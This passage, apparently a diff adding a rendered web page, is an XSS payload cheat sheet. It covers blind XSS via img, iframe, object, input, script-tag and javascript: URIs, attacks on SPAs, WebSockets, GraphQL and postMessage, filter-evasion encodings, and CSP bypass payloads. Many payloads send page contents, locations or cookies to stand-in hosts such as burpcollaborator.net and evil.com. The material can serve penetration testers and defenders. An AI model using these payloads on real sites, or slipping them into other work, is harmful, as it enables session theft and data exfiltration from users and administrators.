+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this.src=&#34;https://&#34;+btoa(document.location)+&#34;.example.burpcollaborator.net/image-dns?&#34;&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this.src=&#34;https://example.burpcollaborator.net/image-xss?&#34;+btoa(document.location)&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fetch(&#34;https://example.burpcollaborator.net/image-xss-post&#34;,{method:&#34;POST&#34;,body:btoa(document.body.innerHTML),mode:&#34;no-cors&#34;})&#39;</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="3-dns-based-blind-xss">
+  <strong>3. DNS-based Blind XSS</strong>
+  <a class="anchor" href="#3-dns-based-blind-xss">#</a>
+</h3>
+<p>Used when only DNS resolution is allowed outbound; the payload exfiltrates data through a DNS lookup. Ideal for highly restricted internal networks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this.src=&#34;https://&#34;+btoa(document.location)+&#34;.example.burpcollaborator.net/image-dns?&#34;&#39;</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="4-iframe-based-blind-xss">
+  <strong>4. iframe-based Blind XSS</strong>
+  <a class="anchor" href="#4-iframe-based-blind-xss">#</a>
+</h3>
+<p>Used when iframes are allowed; the iframe loads JavaScript internally and sends data to your server. Useful when <code>script</code> and <code>img</code> tags are filtered.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript:window.location=&#34;https://example.burpcollaborator.net/iframe-src?&#34;+btoa(parent.document.location)&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;script&gt;window.location=&#34;https://example.burpcollaborator.net/iframe-srcdoc?&#34;+btoa(parent.document.location)&lt;/script&gt;&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;script&gt;fetch(&#34;https://example.burpcollaborator.net/iframe-srcdoc-post&#34;,{method:&#34;POST&#34;,body:btoa(parent.document.body.innerHTML),mode:&#34;no-cors&#34;})&lt;/script&gt;&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="5-object-tag-blind-xss">
+  <strong>5. Object-tag Blind XSS</strong>
+  <a class="anchor" href="#5-object-tag-blind-xss">#</a>
+</h3>
+<p>Used when <code>&lt;object&gt;</code> elements are allowed while scripts are sanitized; it loads JavaScript via the data attribute. Works in older admin dashboards.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript:window.location=&#34;https://example.burpcollaborator.net/iframe-src?&#34;+btoa(parent.document.location)&#39;</span>&gt;&lt;/<span style="color:#f92672">object</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="6-input-field-blind-xss">
+  <strong>6. Input-field Blind XSS</strong>
+  <a class="anchor" href="#6-input-field-blind-xss">#</a>
+</h3>
+<p>Used when your payload ends up inside an input field viewed by an internal user. The <code>onfocus</code> event fires automatically if autofocus is permitted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">autofocus</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fetch(&#34;https://example.burpcollaborator.net/input-post&#34;,{method:&#34;POST&#34;,body:btoa(document.body.innerHTML),mode:&#34;no-cors&#34;})&#39;</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="7-script-tag-callbacks">
+  <strong>7. Script-tag Callbacks</strong>
+  <a class="anchor" href="#7-script-tag-callbacks">#</a>
+</h3>
+<p>Used when external scripts are allowed but inline JS isn’t; the script loads from your server and executes automatically. Good for admin-panel triggers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://example.burpcollaborator.net/script-tag</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/script-tag-type&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;module&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/script-tag-module&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nomodule</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/script-tag-nomodule&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="8-javascript-uri-scheme">
+  <strong>8. JavaScript URI Scheme</strong>
+  <a class="anchor" href="#8-javascript-uri-scheme">#</a>
+</h3>
+<p>Used when links or URL fields are rendered as clickable anchors; clicking the link executes JS in the admin’s browser.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span>window.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/js-scheme?&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">location</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://example.burpcollaborator.net/js-scheme-fetch?&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">location</span>))
+</span></span></code></pre></div><hr>
+<h3 id="9-advanced-svg-blind-xss">
+  <strong>9. Advanced SVG Blind XSS</strong>
+  <a class="anchor" href="#9-advanced-svg-blind-xss">#</a>
+</h3>
+<p>Used when HTML sanitization removes normal tags but SVG is still accepted. Encoded payloads execute through the <code>onload</code> inside SVG.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ZWNobyAnWFNTJw==&#34;</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eval(atob(this.id))&#34;</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="modern-attack-surfaces">
+  Modern Attack Surfaces
+  <a class="anchor" href="#modern-attack-surfaces">#</a>
+</h2>
+<h3 id="1-single-page-applications-spas">
+  <strong>1. Single Page Applications (SPAs)</strong>
+  <a class="anchor" href="#1-single-page-applications-spas">#</a>
+</h3>
+<p>SPAs often manipulate the DOM dynamically, making them vulnerable when hash fragments (<code>#</code>) or client-side routing are not sanitized.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.example.com/#/dashboard/&gt;&lt;img src=x onerror=alert(1)&gt;
+</span></span></span></code></pre></div><p>Common SPA pitfalls:</p>
+<ul>
+<li>Angular/React/Vue bypass via template injection</li>
+<li>Client-side routers interpreting payloads as routes</li>
+<li>Unsafe <code>innerHTML</code> usage</li>
+</ul>
+<h3 id="2-websockets">
+  <strong>2. WebSockets</strong>
+  <a class="anchor" href="#2-websockets">#</a>
+</h3>
+<p>WebSockets transmit raw data. If the server reflects messages back to clients or stores them, they can trigger XSS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Cookie Exfiltration
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;&lt;img src=x onerror=&#34;fetch(`https://evil.com/?c=${document.cookie}`)&#34;&gt;&#39;</span>);
+</span></span></code></pre></div><p>Attack scenarios:</p>
+<ul>
+<li>Chat applications</li>
+<li>Real-time dashboards</li>
+<li>Collaborative editors</li>
+</ul>
+<h3 id="3-server-side-rendering-ssr">
+  <strong>3. Server-Side Rendering (SSR)</strong>
+  <a class="anchor" href="#3-server-side-rendering-ssr">#</a>
+</h3>
+<p>SSR frameworks (Next.js, Nuxt, Remix) render HTML on the server. If unsanitized input is embedded, XSS becomes stored or reflected.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userInput</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">unsafe</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>; <span style="color:#75715e">// inserted into SSR HTML output
+</span></span></span></code></pre></div><p>Dangerous SSR patterns:</p>
+<ul>
+<li>Direct variable interpolation into templates</li>
+<li>Using <code>dangerouslySetInnerHTML</code> incorrectly</li>
+<li>Custom template engines without escaping</li>
+</ul>
+<h3 id="4-graphql">
+  <strong>4. GraphQL</strong>
+  <a class="anchor" href="#4-graphql">#</a>
+</h3>
+<p>GraphQL endpoints accept nested fields and long queries. If the server injects query values into HTML (e.g., templates, logs, UI panels), it may execute script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-graphql" data-lang="graphql"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  search(<span style="color:#66d9ef">query</span>: <span style="color:#e6db74">&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Common issues:</p>
+<ul>
+<li>GraphiQL / Playground reflecting user queries</li>
+<li>Error messages rendering raw input</li>
+<li>HTML reports/debug tools showing unescaped fields</li>
+</ul>
+<h3 id="5-web-components">
+  <strong>5. Web Components</strong>
+  <a class="anchor" href="#5-web-components">#</a>
+</h3>
+<p>Shadow DOM misuse often leads to DOM-based XSS when user HTML is injected into custom components.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">attachShadow</span>({ <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;open&#39;</span> }).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">userInput</span>;
+</span></span></code></pre></div><p>Risky patterns:</p>
+<ul>
+<li>Custom elements using <code>.innerHTML</code></li>
+<li>Passing user-controlled HTML through attributes</li>
+<li>Template cloning without sanitization</li>
+</ul>
+<h3 id="6-pdf-generators">
+  <strong>6. PDF Generators</strong>
+  <a class="anchor" href="#6-pdf-generators">#</a>
+</h3>
+<p>Many PDF engines support HTML → PDF conversion. Injecting HTML/JS can produce XSS when:</p>
+<ul>
+<li>PDF is rendered in-browser</li>
+<li>Viewer allows JS execution</li>
+<li>Dynamic PDF templates include user data</li>
+</ul>
+<p>Example payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;XSS in PDF&#34;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Other vectors:</p>
+<ul>
+<li>Malicious <code>&lt;img&gt;</code> with JS inside URI</li>
+<li>Injected JS in annotations</li>
+<li>Embedded forms executing JavaScript</li>
+</ul>
+<h3 id="7-postmessage-attacks">
+  <strong>7. <code>postMessage</code> Attacks</strong>
+  <a class="anchor" href="#7-postmessage-attacks">#</a>
+</h3>
+<p>Vulnerabilities occur when a site receives a <code>message</code> event but <strong>fails to validate the origin</strong> or <strong>dangerously inserts the message into the DOM</strong>.</p>
+<p><strong>Example payload sent from attacker iframe/window:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>window.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+</span></span></code></pre></div><p><strong>Vulnerable receiver code:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// No origin check + using innerHTML = XSS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;output&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><hr>
+<h2 id="bypassing-modern-defenses">
+  Bypassing Modern Defenses
+  <a class="anchor" href="#bypassing-modern-defenses">#</a>
+</h2>
+<h3 id="filter-evasion">
+  <strong>Filter Evasion</strong>
+  <a class="anchor" href="#filter-evasion">#</a>
+</h3>
+<p>Techniques used to bypass naive filters, case checks, encoding checks, and signature-based WAF rules.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">ScRiPt</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">ScRiPt</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span><span style="color:#e6db74">`1`</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;
+</span></span></code></pre></div><p><strong>HTML Entity Encoding</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lt</span>;<span style="color:#a6e22e">script</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">gt</span>;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lt</span>;<span style="color:#960050;background-color:#1e0010">/script&amp;gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">60</span>;<span style="color:#a6e22e">script</span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">62</span>;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">60</span>;<span style="color:#960050;background-color:#1e0010">/script&amp;#62;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">x3C</span>;<span style="color:#a6e22e">script</span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">x3E</span>;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">x3C</span>;<span style="color:#960050;background-color:#1e0010">/script&amp;#x3E;</span>
+</span></span></code></pre></div><p><strong>Double / Over-Encoded Payloads</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Cscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ealert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">C</span><span style="color:#f92672">/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">253</span><span style="color:#a6e22e">Cscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">253</span><span style="color:#a6e22e">Ealert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">253</span><span style="color:#a6e22e">C</span><span style="color:#f92672">/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">%</span><span style="color:#ae81ff">253</span><span style="color:#a6e22e">E</span>
+</span></span></code></pre></div><p><strong>JavaScript URI schemes</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jAvAsCrIpT</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p><strong>Bypassing Tag Filtering</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">javascript</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mi</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><strong>Attribute Injection</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#f92672">&gt;</span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">autofocus</span> <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>) <span style="color:#75715e">//
+</span></span></span></code></pre></div><hr>
+<h2 id="csp-bypass-techniques">
+  <strong>CSP Bypass Techniques</strong>
+  <a class="anchor" href="#csp-bypass-techniques">#</a>
+</h2>
+<p>Below are the CSP misconfigurations and their corresponding bypass payloads, presented in the same style and format..</p>
+<h3 id="1-inline-javascript-allowed-unsafe-inline">
+  <strong>1. Inline JavaScript Allowed (<code>unsafe-inline</code>)</strong>
+  <a class="anchor" href="#1-inline-javascript-allowed-unsafe-inline">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;unsafe-inline&#39;;
+</code></pre><p>This configuration explicitly permits <strong>inline JavaScript</strong>, meaning any reflected/stored XSS will execute immediately.</p>
+<p><strong>Payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>When <code>unsafe-inline</code> is enabled, <strong>all inline <code>&lt;script&gt;</code> tags, event handlers, and JavaScript URLs execute normally</strong>, defeating CSP.</p>
+<hr>
+<h3 id="2-dangerous-unsafe-eval-enabled">
+  <strong>2. Dangerous <code>unsafe-eval</code> Enabled</strong>
+  <a class="anchor" href="#2-dangerous-unsafe-eval-enabled">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code class="language-visual-basic" data-lang="visual-basic">Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;unsafe-eval&#39; data:;
+</code></pre><p>Here:</p>
+<ul>
+<li><code>unsafe-eval</code> allows <code>eval()</code>, <code>Function()</code>, <code>setTimeout(&quot;…&quot;)</code>, etc.</li>
+<li><code>data:</code> allows scripts loaded from Base64-encoded URLs.</li>
+</ul>
+<p><strong>Bypass payload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:;base64,YWxlcnQoMSk=&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>If <code>data:</code> was not permitted, this would fail - but a DOM XSS using <code>eval(evil_input)</code> would still work.</p>
+<hr>
+<h3 id="3-wildcard-in-script-src">
+  <strong>3. Wildcard in <code>script-src</code></strong>
+  <a class="anchor" href="#3-wildcard-in-script-src">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: default-src &#39;none&#39;; script-src https://example.com *;
+</code></pre><p>The wildcard <code>*</code> overrides the domain restriction, allowing scripts from <strong>any external host</strong>.</p>
+<p><strong>Bypass payloads:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://evil.example.net/pwn.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Or using Base64 if <code>data:</code> is also allowed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:;base64,YWxlcnQoMSk=&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Any attacker-controlled server becomes a valid script source.</p>
+<hr>
+<h3 id="4-missing-object-src-and-default-src">
+  <strong>4. Missing <code>object-src</code> and <code>default-src</code></strong>
+  <a class="anchor" href="#4-missing-object-src-and-default-src">#</a>
+</h3>
+<p><strong>Policy:</strong></p>
+<pre tabindex="0"><code>Content-Security-Policy: script-src &#39;self&#39;; img-src &#39;self&#39;;
+</code></pre><p>Without <code>object-src</code>:</p>
+<ul>
+<li><code>&lt;object&gt;</code> can load arbitrary HTML.</li>
+<li>Base64 HTML inside <code>&lt;object&gt;</code> executes JavaScript.</li>
+</ul>
+<p><strong>Bypass payload:</strong></p>
